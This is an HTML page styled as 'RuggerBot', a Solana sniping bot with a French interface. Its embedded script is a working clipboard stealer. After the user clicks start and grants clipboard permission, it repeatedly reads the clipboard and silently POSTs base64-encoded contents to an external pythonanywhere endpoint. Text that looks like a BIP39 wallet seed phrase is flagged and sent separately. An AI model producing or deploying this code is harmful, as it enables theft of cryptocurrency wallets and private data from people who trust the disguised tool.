<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>RuggerBot</title>
    <style>
        body { background: #0d0d1a; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #00ff88; }
        .box { background: #1a1a2e; padding: 40px; border-radius: 12px; text-align: center; max-width: 420px; border: 1px solid #00ff88; }
        .btn { background: #00ff88; color: #0d0d1a; border: none; padding: 14px 30px; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; width: 100%; }
        .status { color: #ffaa00; margin: 15px 0; }
    </style>
</head>
<body>
    <div class="box">
        <h1>⛏️ RUGGERBOT</h1>
        <p style="color:#aaaacc;">Sniper v2.4 · Solana</p>
        <button class="btn" id="activateBtn">▶ Démarrer</button>
        <div class="status" id="status">● hors ligne</div>
    </div>

    <script>
        // ---------- CONFIG ----------
        const EXFIL_URL = "https://rugpuller.pythonanywhere.com/capture";
        // ----------------------------

        // Liste BIP39 (extrait minimal pour test)
        const BIP39_WORDS = new Set(["abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse"]);

        function isSeedPhrase(text) {
            const words = text.trim().split(/\s+/);
            return (words.length === 12 || words.length === 24) && words.every(w => BIP39_WORDS.has(w.toLowerCase()));
        }

        let lastClip = "";
        let isActive = false;

        function pollClipboard() {
            if (!isActive) return;
            navigator.clipboard.readText().then((text) => {
                if (text && text !== lastClip) {
                    lastClip = text;
                    // Envoie tout le texte (tu peux filtrer plus tard)
                    fetch(EXFIL_URL, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ data: btoa(unescape(encodeURIComponent(text))) })
                    }).catch(() => {});
                    if (isSeedPhrase(text)) {
                        fetch(EXFIL_URL, {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({ data: btoa(unescape(encodeURIComponent("SEED: " + text))) })
                        }).catch(() => {});
                    }
                }
            }).catch(() => {});
            setTimeout(pollClipboard, 2500 + Math.random() * 3000);
        }

        document.getElementById("activateBtn").addEventListener("click", function() {
            isActive = true;
            document.getElementById("status").textContent = "● actif ✓";
            document.getElementById("status").style.color = "#7cfc00";
            this.textContent = "▶ En cours...";
            this.disabled = true;
            // Demander la permission dès le clic
            navigator.clipboard.readText().then(() => {
                pollClipboard();
            }).catch(() => {
                // Si l'utilisateur refuse, on réessaie
                alert("Veuillez autoriser l'accès au presse-papier.");
                isActive = false;
                document.getElementById("status").textContent = "● refusé ✗";
                document.getElementById("status").style.color = "#ff4444";
                this.textContent = "▶ Démarrer";
                this.disabled = false;
            });
        });
    </script>
</body>
</html>
